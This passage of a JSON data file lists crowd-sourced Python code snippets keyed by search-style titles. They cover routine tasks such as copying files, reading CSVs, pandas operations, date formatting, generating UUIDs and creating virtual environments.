    "description": "from wsgiref.handlers import format_date_time from datetime import datetime from time import mktime  now = datetime.now() stamp = mktime(now.timetuple()) print format_date_time(stamp) #--> Wed, 22 Oct 2008 10:52:40 GMT \n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3149,
    "keyword": null,
    "link": null,
    "title": " python convert file into list",
    "description": "# Saving the list a = [\"apple\", \"banana\", 2, 3] with open(\"test.txt\", \"w\") as f:     for item in a:         f.write(\"%s\\n\" % item)  with open(\"test.txt\", \"r\") as f:     print(f.read())  # Converting contents of file into new list f = open(\"test.txt\", \"r\") listItems = f.read().splitlines() print(listItems)\nf = open(filename, \"r\")    listItems = f.read().splitlines()\n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3150,
    "keyword": null,
    "link": null,
    "title": " python convert hex to binary",
    "description": "my_hexdata = \"1a\"  scale = 16 # equal to hexadecimal  bin(int(my_hexdata, scale))[2:].zfill(len(my_hexdata)*4) # By changing the parameter of the zfill function we allow for any length of # hexadecimal code, which is more useful when using this code.\nmy_hexdata = \"1a\"  scale = 16 ## equals to hexadecimal  num_of_bits = 8  bin(int(my_hexdata, scale))[2:].zfill(num_of_bits)\n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3151,
    "keyword": null,
    "link": null,
    "title": " python convert image to base64",
    "description": "import base64  file = 'deer.jpg' image = open(file, 'rb') image_read = image.read() image_64_encode = base64.encodebytes(image_read) #encodestring also works aswell as decodestring  print('This is the image in base64: ' + str(image_64_encode))  image_64_decode = base64.decodebytes(image_64_encode)  image_result = open('deer_decode.jpg', 'wb') # create a writable image and write the decoding result image_result.write(image_64_decode)  \nimport base64 import requests   def get_as_base64(url):      return base64.b64encode(requests.get(url).content) \n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3152,
    "keyword": null,
    "link": null,
    "title": " python convert json to pandas dataframe",
    "description": "# Basic syntax: dataframe = pd.DataFrame.from_dict(json_data, orient=\"index\")  # Example usage: import json import pandas as pd  # Make json-formatted string: json_string = '{ \"name\":\"John\", \"age\":30, \"car\":\"None\" }' your_json = json.loads(json_string) print(your_json) --> {'name': 'John', 'age': 30, 'car': 'None'}  # Convert to pandas dataframe: dataframe = pd.DataFrame.from_dict(your_json, orient=\"index\") print(dataframe)          0 name  John age     30 car   None  # Note, orient=\"index\" sets the keys as rownames. orient=\"columns\" is #\tthe default and is supposed to set the keys as column names, but I #\tcouldn't seem to get it to work with this example\npd.read_json('Path/to/File.json')\n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3153,
    "keyword": null,
    "link": null,
    "title": " python convert list to dict with index",
    "description": ">>> lst = ['A','B','C'] >>> {k: v for v, k in enumerate(lst)} {'A': 0, 'C': 2, 'B': 1} \n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3154,
    "keyword": null,
    "link": null,
    "title": " python convert list to true falsebased on condition",
    "description": "# Basic syntax: boolean_list = [True if x == 'condition' else False for x in your_list] # This converts a list to True/False based on the condition specified\n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3155,
    "keyword": null,
    "link": null,
    "title": " python convert nan to empty string",
    "description": "# Option 1 df1 = df.replace(np.nan, '', regex=True) # All data frame  # Option 2 df[['column1','column2']] = df[['column1','column2']].fillna('') # Specific columns\ndf.fillna('', inplace=True)\n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3156,
    "keyword": null,
    "link": null,
    "title": " python convert number to list of digits",
    "description": "n = 1234 # convert integer to list of digits list_of_digits = list(map(int, f\"{n}\"))  # convert list of digits back to number number = int(''.join(map(str, list_of_digits)))\n# Declare a number a = 12345 #Number to list a_list = [int(x) for x in str(a)]\n list(map(int, str(678))) [6, 7, 8]\n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3157,
    "keyword": null,
    "link": null,
    "title": " python convert number to string with leading zeros",
    "description": "str(1).zfill(2) # 1 will be '01'  str(23).zfill(4) # 23 will be '0023'\n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3158,
    "keyword": null,
    "link": null,
    "title": " python convert png to jpg",
    "description": "from PIL import Image  img = Image.open('image.png') rgb_img = img.convert('RGB') rgb_img.save('image.jpg')\n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3159,
    "keyword": null,
    "link": null,
    "title": " python convert querydict to dict",
    "description": "myDict = dict(queryDict.iterlists())\n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3160,
    "keyword": null,
    "link": null,
    "title": " python convert twitter id to date",
    "description": "from datetime import datetime shifted = id >> 22  timestamp = shifted + 1288834974657 time_created = datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d')\n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3161,
    "keyword": null,
    "link": null,
    "title": " python convert xd8 to utf8",
    "description": "result = string.decode('unicode-escape').encode('latin1').decode('utf-8')\n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3162,
    "keyword": null,
    "link": null,
    "title": " python convery list to array",
    "description": "import numpy as np my_list = [2,4,6,8,10] my_array = np.array(my_list) # printing my_array print my_array # printing the type of my_array print type(my_array)\n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3163,
    "keyword": null,
    "link": null,
    "title": " python copy a 2D list",
    "description": "y = [row[:] for row in x] \n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3164,
    "keyword": null,
    "link": null,
    "title": " python copy dir",
    "description": "import shutil  shutil.copytree(source, destination)\nfrom shutil import copytree shutil.copytree(\"sourcedir\", \"destination\")\n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3165,
    "keyword": null,
    "link": null,
    "title": " python copy file",
    "description": "from shutil import copyfile copyfile(src, dst)\n shutil has many methods you can use. One of which is:  from shutil import copyfile copyfile(src, dst)\nimport shutil  original = r'original path where the file is currently stored\\file name.file extension' target = r'target path where the file will be copied\\file name.file extension'  shutil.copyfile(original, target) \n# Copy a file in Python using  copy() method import shutil shutil.copy( '/src/test/source.txt' , '/dest/destination.txt' )\nfrom shutil import copyfile copyfile(src, dst) \n# Copy a file in Python using  copy2() method import shutil shutil.copy2( '/src/test/source.txt' , '/dest/destination.txt' )\n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3166,
    "keyword": null,
    "link": null,
    "title": " python copy file to another directory",
    "description": "import shutil  shutil.copytree(source, destination)\nimport shutil shutil.copy2('/src/dir/file.ext', '/dst/dir/newname.ext') # complete target filename given shutil.copy2('/src/file.ext', '/dst/dir') # target filename is /dst/dir/file.ext\nimport shutil  original = r'original path where the file is currently stored\\file name.file extension' target = r'target path where the file will be copied\\file name.file extension'  shutil.copyfile(original, target) \n# Source path  src = 'C:/Users / Rajnish / Desktop / GeeksforGeeks / source'     # Destination path  dest = 'C:/Users / Rajnish / Desktop / GeeksforGeeks / destination'     # Copy the content of  # source to destination  destination = shutil.copytree(src, dest) \nfrom shutil import copyfile copyfile(src, dst) \n",
    "reg_date": "2021-10-12T11:32:59.000Z"
  },
  {
    "id": 3167,
    "keyword": null,
    "link": null,
    "title": " python copy file to new filename",
    "description": " shutil has many methods you can use. One of which is:  from shutil import copyfile copyfile(src, dst)\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3168,
    "keyword": null,
    "link": null,
    "title": " python copy paste file",
    "description": "#shutil module has many methods you can use from shutil import copyfile copyfile(source, destination) # Copy the contents of the file named src to a file named dst. Both src and dst need to be the entire filename of the files, including path. # The destination location must be writable; otherwise, an IOError exception will be raised. # If dst already exists, it will be replaced. # Special files such as character or block devices and pipes cannot be copied with this function. # With copy, src and dst are path names given as strs.\nfrom shutil import copyfile copyfile(src, dst)\nimport shutil  original = r'original path where the file is currently stored\\file name.file extension' target = r'target path where the file will be copied\\file name.file extension'  shutil.copyfile(original, target) \n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3169,
    "keyword": null,
    "link": null,
    "title": " python count files directory",
    "description": "import os len(os.listdir(directory))\n# accepts any number of paths,  # returns the total amound of files (not dirs) that are in the given paths # looks recursively  def countFiles(*paths):     \"\"\"     :param paths: list of all paths, the number of files are added     :return: return the number of files (not directories) in the folders recursively (subfolders are checked as well)     \"\"\"     def helper(path: str):         count = 0         # iterate through all files and dir names in path         for fileName in os.listdir(path):             filePath = join(path, fileName)             if isfile(filePath): # if file, increment                 count += 1             elif isdir(filePath): # if dir, recursively count files in dir                 count += helper(filePath)         return count      numFiles = 0     for path in paths:         numFiles += helper(path)     return numFiles\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3170,
    "keyword": null,
    "link": null,
    "title": " python count matching elements in a list",
    "description": "# Basic syntax: sum(1 for item in your_list if item == \"some_condition\") # This counts the items in your_list for which item == \"some_condition\" #\tis true. Of course, this can be changed to any conditional statement\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3171,
    "keyword": null,
    "link": null,
    "title": " python count null values in dataframe",
    "description": "#Python, pandas #Count missing values for each column of the dataframe df  df.isnull().sum() \n# Count total missing values in a dataframe  df.isnull().sum().sum()  # Gives a integer value\nIn [5]: df = pd.DataFrame({'a':[1,2,np.nan], 'b':[np.nan,1,np.nan]})  In [6]: df.isna().sum() Out[6]: a    1 b    2 dtype: int64\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3172,
    "keyword": null,
    "link": null,
    "title": " python count number of zeros in a column",
    "description": "(myDataFrame[column_name] == 0).sum()\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3173,
    "keyword": null,
    "link": null,
    "title": " python count repeated elements in a list",
    "description": "# Basic syntax: dict_of_counts = {item:your_list.count(item) for item in your_list}  # Example usage: your_list = [\"a\", \"b\", \"a\", \"c\", \"c\", \"a\", \"c\"] dict_of_counts = {item:your_list.count(item) for item in your_list} print(dict_of_counts) --> {'a': 3, 'b': 1, 'c': 3}\nstudent_grades = [9.1, 8.8, 10.0, 7.7, 6.8, 8.0, 10.0, 8.1, 10.0, 9.9]  samebnumber = student_grades.count(10.0)  print(samebnumber)\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3174,
    "keyword": null,
    "link": null,
    "title": " python count the number of zeros in each row of a pandas dataframe",
    "description": "# Basic syntax: (pandas_dataframe == 0).sum(axis=1) # Where axis 1 specifies that sum will operate on rows. Use 0 for columns  # Example usage: # Create Pandas dataframe: import pandas as pd pandas_dataframe = pd.DataFrame({'a':[1,0,0,1,3],                                   'b':[0,0,1,0,1],                                   'c':[0,0,0,0,0]}) \ta\tb\tc 0\t1\t0\t0 1\t0\t0\t0 2\t0\t1\t0 3\t1\t0\t0 4\t3\t1\t0  (pandas_dataframe == 0).sum(axis=1) 0    2 1    3 2    2 3    2 4    1\ndf.astype(bool).sum(axis=0)\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3175,
    "keyword": null,
    "link": null,
    "title": " python create 4x4 matrix",
    "description": "import numpy as np x = np.zeros((4, 4)) x[::2, 1::2] = 1 x[1::2, ::2] = 1 print(x)\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3176,
    "keyword": null,
    "link": null,
    "title": " python create a list of alphabets",
    "description": ">>> import string >>> string.ascii_lowercase 'abcdefghijklmnopqrstuvwxyz'\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3177,
    "keyword": null,
    "link": null,
    "title": " python create date",
    "description": "import datetime  x = datetime.datetime(2020, 5, 17) print(x)  # 2020-05-17 00:00:00\n",
    "reg_date": "2021-10-12T11:33:00.000Z"
  },
  {
    "id": 3178,
    "keyword": null,
    "link": null,
    "title": " python create directory",
    "description": "# This requires Python&rsquo;s OS module import os  # 'mkdir' creates a directory in current directory. os.mkdir('tempDir')  # can also be used with a path, if the other folders exist. os.mkdir('tempDir2/temp2/temp')  # 'makedirs' creates a directory with it's path, if applicable. os.makedirs('tempDir2/temp2/temp') \n#creates a directory without throwing an error import os def create_dir(dir):   if not os.path.exists(dir):     os.makedirs(dir)     print(\"Created Directory : \", dir)   else:     print(\"Directory already existed : \", dir)   return dir \nimport os  # define the name of the directory to be created path = \"/tmp/year\"  try:     os.mkdir(path) except OSError:     print (\"Creation of the directory %s failed\" % path) else:     print (\"Successfully created the directory %s \" % path) \nnewpath = r'C:\\Program Files\\arbitrary'  if not os.path.exists(newpath):     os.makedirs(newpath)\nnewpath = 'C:\\Program Files\\arbitrary'  if not os.path.exists(newpath):     os.makedirs(newpath) \nimport os directory = \"Krishna\" path_dir = \"C:/Users/../Desktop/current_dir/\" if not os.path.exists(directory): \tos.mkdir(os.path.join(path_dir, directory))\n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3179,
    "keyword": null,
    "link": null,
    "title": " python create environment variable",
    "description": "import os os.environ['variable_name'] = 'variable_value'\nDEBUG=False python manage.py\n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3180,
    "keyword": null,
    "link": null,
    "title": " python create file if not exists",
    "description": "import os  if not os.path.exists(path):     with open(path, 'w'): \nimport os   if not os.path.exists(\"PATH\"):     with open(\"PATH\", \"w\"):         pass\n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3181,
    "keyword": null,
    "link": null,
    "title": " python create hash from string",
    "description": "import hashlib hash_object = hashlib.sha256(b'Hello World') hex_dig = hash_object.hexdigest() print(hex_dig) \n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3182,
    "keyword": null,
    "link": null,
    "title": " python create nested directory",
    "description": "import os if not os.path.exists('my_folder'):     os.makedirs('my_folder')\nfrom pathlib import Path Path(\"/my/directory\").mkdir(parents=True, exist_ok=True)    #python 3.5 above\n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3183,
    "keyword": null,
    "link": null,
    "title": " python create new folder if not exist",
    "description": "import os if not os.path.exists('my_folder'):     os.makedirs('my_folder')\ntry:     os.makedirs(\"path/to/directory\") except FileExistsError:     # directory already exists     pass \n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3184,
    "keyword": null,
    "link": null,
    "title": " python create new pandas dataframe with specific columns",
    "description": "# Basic syntax: new_dataframe = old_dataframe.filter(['Columns','you','want'], axis=1)\nnew = old[['A', 'C', 'D']].copy()\nnew = pd.DataFrame([old.A, old.B, old.C]).transpose()\n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3185,
    "keyword": null,
    "link": null,
    "title": " python create uuid",
    "description": ">>> import uuid >>> uuid.uuid4() UUID('bd65600d-8669-4903-8a14-af88203add38') >>> str(uuid.uuid4()) 'f50ec0b7-f960-400d-91f0-c42a6d44e3d0' >>> uuid.uuid4().hex '9fe2c4e93f654fdbb24c02b15259716c' \n# Python3 code to generate the  # random id using uuid1()     import uuid     # Printing random id using uuid1()  print (\"The random id using uuid1() is : \",end=\"\")  print (uuid.uuid1()) \n>>> import uuid  >>> # make a random UUID >>> uuid.uuid4() UUID('bd65600d-8669-4903-8a14-af88203add38')  >>> # Convert a UUID to a string of hex digits in standard form >>> str(uuid.uuid4()) 'f50ec0b7-f960-400d-91f0-c42a6d44e3d0'  >>> # Convert a UUID to a 32-character hexadecimal string >>> uuid.uuid4().hex '9fe2c4e93f654fdbb24c02b15259716c' \nimport uuid; uuid.uuid4()\nimport uuid; uuid.uuid1()\n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3186,
    "keyword": null,
    "link": null,
    "title": " python create virtualenv",
    "description": "#------FOR LINUX/MAC---------# #installing venv  sudo apt-get install python3.6-venv #creating virtual env python3 -m venv env #activating virtual env source env/bin/activate   #-------FOR WINDOWS----------# #installing venv py -m pip install --user virtualenv #creating virtual env py -m venv env #activating virtual env .\\env\\Scripts\\activate \npython3 -m venv env python -m virtualenv env #py2  source env/bin/activate  #all this is on same directory \n# Create the virtual environment. python -m venv venv  # Activate the env. venv\\Scripts\\activate.bat\n# for windows 10  py -m venv myvirtualenv myvirtualenv\\Scripts\\activate #!!!! use \"\\\" not \"/\" !!!!!\npip install virtualenv # install first cd projectfolder # go to project folder python -m venv ./venv # Create a virtual environment named venv Activate.ps1 # (powershell) start the file  to start the environment activate.bat # (cmd) start the file  to start the environment # if it worked you'll see a (venv) in front of your cursor path\nc:\\>python -m venv c:\\path\\to\\myenv \n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3187,
    "keyword": null,
    "link": null,
    "title": " python createvirtual env",
    "description": "python3 -m venv tutorial-env\n",
    "reg_date": "2021-10-12T11:33:01.000Z"
  },
  {
    "id": 3188,
    "keyword": null,
    "link": null,
    "title": " python csv",
    "description": "# pip install pandas  import pandas as pd  # Read the csv file data = pd.read_csv('data.csv')  # Print it out if you want print(data)\nimport csv  with open('names.csv', 'w') as csvfile:     fieldnames = ['first_name', 'last_name']     writer = csv.DictWriter(csvfile, fieldnames=fieldnames)      writer.writeheader()     writer.writerow({'first_name': 'Baked', 'last_name': 'Beans'})     writer.writerow({'first_name': 'Lovely', 'last_name': 'Spam'})     writer.writerow({'first_name': 'Wonderful', 'last_name': 'Spam'}) \n>>> import csv >>> with open('names.csv', newline='') as csvfile: ...     reader = csv.DictReader(csvfile) ...     for row in reader: ...         print(row['first_name'], row['last_name']) ... Eric Idle John Cleese  >>> print(row) {'first_name': 'John', 'last_name': 'Cleese'} \nwith open(r'c:\\dl\\FrameRecentSessions.csv') as csv_file:     csv_reader = csv.reader(csv_file, delimiter=',')     line_count = 0     for row in csv_reader:         if line_count == 0:             print(f'Column names are {\", \".join(row)}')             line_count += 1         else:             print(f'\\t{row[0]} works in the {row[1]} department, and was born in {row[2]}.')             line_count += 1     print(f'Processed {line_count} lines.')\nimport csv  with open('employee_birthday.txt') as csv_file:     csv_reader = csv.reader(csv_file, delimiter=',')     line_count = 0     for row in csv_reader:         if line_count == 0:             print(f'Column names are {\", \".join(row)}')             line_count += 1         else:             print(f'\\t{row[0]} works in the {row[1]} department, and was born in {row[2]}.')             line_count += 1     print(f'Processed {line_count} lines.') \nimport pandas as pd  df = pd.read_csv (r'Path where the CSV file is stored\\File name.csv') print (df) \n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3189,
    "keyword": null,
    "link": null,
    "title": " python csv dict reader",
    "description": "import csv  with open('names.csv', 'w') as csvfile:     fieldnames = ['first_name', 'last_name']     writer = csv.DictWriter(csvfile, fieldnames=fieldnames)      writer.writeheader()     writer.writerow({'first_name': 'Baked', 'last_name': 'Beans'})     writer.writerow({'first_name': 'Lovely', 'last_name': 'Spam'})     writer.writerow({'first_name': 'Wonderful', 'last_name': 'Spam'}) \n>>> import csv >>> with open('names.csv', newline='') as csvfile: ...     reader = csv.DictReader(csvfile) ...     for row in reader: ...         print(row['first_name'], row['last_name']) ... Eric Idle John Cleese  >>> print(row) {'first_name': 'John', 'last_name': 'Cleese'} \nwith open(r'c:\\dl\\FrameRecentSessions.csv') as csv_file:     csv_reader = csv.reader(csv_file, delimiter=',')     line_count = 0     for row in csv_reader:         if line_count == 0:             print(f'Column names are {\", \".join(row)}')             line_count += 1         else:             print(f'\\t{row[0]} works in the {row[1]} department, and was born in {row[2]}.')             line_count += 1     print(f'Processed {line_count} lines.')\nimport csv  with open('names.csv', 'w') as csvfile:     fieldnames = ['first_name', 'last_name']     writer = csv.DictWriter(csvfile, fieldnames=fieldnames)      writer.writeheader()     writer.writerow({'first_name': 'Baked', 'last_name': 'Beans'})     writer.writerow({'first_name': 'Lovely', 'last_name': 'Spam'})     writer.writerow({'first_name': 'Wonderful', 'last_name': 'Spam'})\n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3190,
    "keyword": null,
    "link": null,
    "title": " python csv file tools",
    "description": "import csv with open('some.csv', newline='') as f:     reader = csv.reader(f)     for row in reader:         print(row) \n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3191,
    "keyword": null,
    "link": null,
    "title": " python csv update row",
    "description": "from tempfile import NamedTemporaryFile import shutil import csv  filename = 'my.csv' tempfile = NamedTemporaryFile(mode='w', delete=False)  fields = ['ID', 'Name', 'Course', 'Year']  with open(filename, 'r') as csvfile, tempfile:     reader = csv.DictReader(csvfile, fieldnames=fields)     writer = csv.DictWriter(tempfile, fieldnames=fields)     for row in reader:         if row['ID'] == str(stud_ID):             print('updating row', row['ID'])             row['Name'], row['Course'], row['Year'] = stud_name, stud_course, stud_year         row = {'ID': row['ID'], 'Name': row['Name'], 'Course': row['Course'], 'Year': row['Year']}         writer.writerow(row)  shutil.move(tempfile.name, filename)\n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3192,
    "keyword": null,
    "link": null,
    "title": " python csv write add new line",
    "description": "with open('output.csv', 'w', newline='\\n', encoding='utf-8') as f:     writer = csv.writer(f)     ...\n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3193,
    "keyword": null,
    "link": null,
    "title": " python ctypes get current window",
    "description": "import ctypes window = ctypes.windll.user32.GetForegroundWindow()\n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3194,
    "keyword": null,
    "link": null,
    "title": " python current date",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\n# Example usage: import datetime date_time = datetime.datetime.now() print(date_time) --> 2020-10-03 15:29:54.822751  # From the date_time variable, you can extract the date in various # custom formats with .strftime(), for example: date_time.strftime(\"%d/%m/%Y\") --> '03/10/2020' # dd/mm/yyyy  date_time.strftime(\"%m/%d/%y\") --> '10/03/20' # mm/dd/yy  date_time.strftime(\"%Y/%m/%d\") --> '2020/10/03'  date_time.strftime(\"%Y-%m-%d\") --> '2020-10-03'  date_time.strftime(\"%B %d, %Y\") --> 'October 03, 2020'  # Key for other custom date/time formats: Directive\tDescription\t\t\t\t\t\t\t\tExample %a\t\t\tWeekday, short version\t\t\t\t\tWed\t %A\t\t\tWeekday, full version\t\t\t\t\tWednesday\t %w\t\t\tWeekday as a number 0-6, 0 is Sunday\t3\t %d\t\t\tDay of month 01-31\t\t\t\t\t\t31\t %b\t\t\tMonth name, short version\t\t\t\tDec\t %B\t\t\tMonth name, full version\t\t\t\tDecember\t %m\t\t\tMonth as a number 01-12\t\t\t\t\t12\t %y\t\t\tYear, short version, without century\t18\t %Y\t\t\tYear, full version\t\t\t\t\t\t2018\t %H\t\t\tHour 00-23\t\t\t\t\t\t\t\t17\t %I\t\t\tHour 00-12\t\t\t\t\t\t\t\t05\t %p\t\t\tAM/PM\t\t\t\t\t\t\t\t\tPM\t %M\t\t\tMinute 00-59\t\t\t\t\t\t\t41\t %S\t\t\tSecond 00-59\t\t\t\t\t\t\t08\t %f\t\t\tMicrosecond 000000-999999\t\t\t\t548513\t %z\t\t\tUTC offset\t\t\t\t\t\t\t\t+0100\t %Z\t\t\tTimezone\t\t\t\t\t\t\t\tCST\t %j\t\t\tDay number of year 001-366\t\t\t\t365\t %U\t\t\tWeek number of year 00-53\t\t\t\t52\t %c\t\t\tLocal version of date and time\t\t\tMon Dec 31 17:41:00 2018\t %x\t\t\tLocal version of date\t\t\t\t\t12/31/18\t %X\t\t\tLocal version of time\t\t\t\t\t17:41:00\t %%\t\t\tA % character\t\t\t\t\t\t\t%\nfrom datetime import datetime now = datetime.now() print(\"date and time now: \", now)  #you can also personalize how the formats, example: dt = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time now: \", dt)  #the output will be #date and time now:  22/12/2020 01:19:32\nfrom datetime import date today = date.today().strftime(\"%d-%m-%Y\")\nfrom datetime import datetime  # datetime object containing current date and time now = datetime.now()   print(\"now =\", now)  # dd/mm/YY H:M:S dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time =\", dt_string)\t  # now = 2021-06-25 07:58:56.550604 # date and time = 25/06/2021 07:58:56\n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3195,
    "keyword": null,
    "link": null,
    "title": " python current year",
    "description": "import datetime now = datetime.datetime.now().year print(now)\nfrom datetime import date current_date = date.today()  print(\"Current date: \", current_date) print(\"Current year:\", current_date.year)\n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3196,
    "keyword": null,
    "link": null,
    "title": " python currnent time",
    "description": "from datetime import datetime now = datetime.now() print(now.strftime(\"%d/%m/%Y %H:%M:%S\"))\n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3197,
    "keyword": null,
    "link": null,
    "title": " python currnent time now",
    "description": "from datetime import datetime now = datetime.now() print(now.strftime(\"%d/%m/%Y %H:%M:%S\"))\n",
    "reg_date": "2021-10-12T11:33:02.000Z"
  },
  {
    "id": 3198,
    "keyword": null,
    "link": null,
    "title": " python cv2.Canny()",
    "description": "import numpy as np import cv2 as cv ### For \"image.jpg\" img = cv.imread('image.jpg',0) edges = cv.Canny(img, 100, 200) ### For \"2D array\" img = np.copy(array_2d) # Need to normalize 0 - 255 img = np.uint8((255 * (img - np.min(img)) / np.ptp(img)).astype(int)) edges = cv2.Canny(img, 100, 200)\n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3199,
    "keyword": null,
    "link": null,
    "title": " python cv2 get image shape",
    "description": "import cv2  input_image = cv2.imread('path to image')  input_image_height, input_image_width, input_image_channels = input_image.shape\n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3200,
    "keyword": null,
    "link": null,
    "title": " python cv2 screen capture",
    "description": "import numpy as np import cv2 from PIL import ImageGrab  while True:     img = ImageGrab.grab(bbox=(0, 1000, 100, 1100)) #x, y, w, h     img_np = np.array(img)     frame = cv2.cvtColor(img_np, cv2.COLOR_BGR2GRAY)     cv2.imshow(\"frame\", frame)     if cv2.waitKey(1) & 0Xff == ord('q'):         break      cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3201,
    "keyword": null,
    "link": null,
    "title": " python date add days",
    "description": "date_1 = datetime.datetime.strptime(start_date, \"%m/%d/%y\")  end_date = date_1 + datetime.timedelta(days=10) \n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3202,
    "keyword": null,
    "link": null,
    "title": " python date and time",
    "description": "from datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nfrom datetime import datetime  now = datetime.now().time().strftime(\"%H:%M:%S\") # time object date = datetime.now().strftime(\"%Y-%m-%d\") # date object print(\"date:\",date) print(\"time =\", now)\n%a - Abbreviated weekday name. (Sun, Mon, ...) %A - Full weekday name. (Sunday, Monday, ...) %w - Weekday as a decimal number. (0, 1, ..., 6) %d - Day of the month as a zero-padded decimal. (01, 02, ..., 31) %-d - Day of the month as a decimal number. (1, 2, ..., 30) %b - Abbreviated month name. (Jan, Feb, ..., Dec) %B - Full month name. (January, February, ...) %m - Month as a zero-padded decimal number. (01, 02, ..., 12) %-m - Month as a decimal number. (1, 2, ..., 12) %y - Year without century as a zero-padded decimal number. (00, 01, ..., 99) %-y - Year without century as a decimal number. (0, 1, ..., 99) %Y - Year with century as a decimal number. (2013, 2019 etc.) %H - Hour (24-hour clock) as a zero-padded decimal number. (00, 01, ..., 23) %-H - Hour (24-hour clock) as a decimal number. (0, 1, ..., 23) %I - Hour (12-hour clock) as a zero-padded decimal number. (01, 02, ..., 12) %-I - Hour (12-hour clock) as a decimal number. (1, 2, ... 12) %p - Locale&rsquo;s AM or PM. (AM, PM) %M - Minute as a zero-padded decimal number. (00, 01, ..., 59) %-M - Minute as a decimal number. (0, 1, ..., 59) %S - Second as a zero-padded decimal number. (00, 01, ..., 59) %-S - Second as a decimal number. (0, 1, ..., 59) %f - Microsecond as a decimal number, zero-padded on the left.  (000000 - 999999) %z - UTC offset in the form +HHMM or -HHMM.   %Z - Time zone name.  %j - Day of the year as a zero-padded decimal number. (001, 002, ..., 366) %-j - Day of the year as a decimal number. (1, 2, ..., 366) %U - Week number of the year (Sunday as the first day of the week). All days in a new year preceding the first Sunday are considered to be in week 0. (00, 01, ..., 53) %W - Week number of the year (Monday as the first day of the week). All days in a new year preceding the first Monday are considered to be in week 0. (00, 01, ..., 53) %c - Locale&rsquo;s appropriate date and time representation. (Mon Sep 30 07:06:05 2013) %x - Locale&rsquo;s appropriate date representation. (09/30/13) %X - Locale&rsquo;s appropriate time representation. (07:06:05) %% - A literal '%' character. (%)\nimport datetime print(datetime.datetime.now()) #datetime.datetime.now() is the syntax \nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\")) \nimport datetime now = datetime.datetime.now() print(now.year, now.month, now.day, now.hour, now.minute, now.second)\n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3203,
    "keyword": null,
    "link": null,
    "title": " python date format",
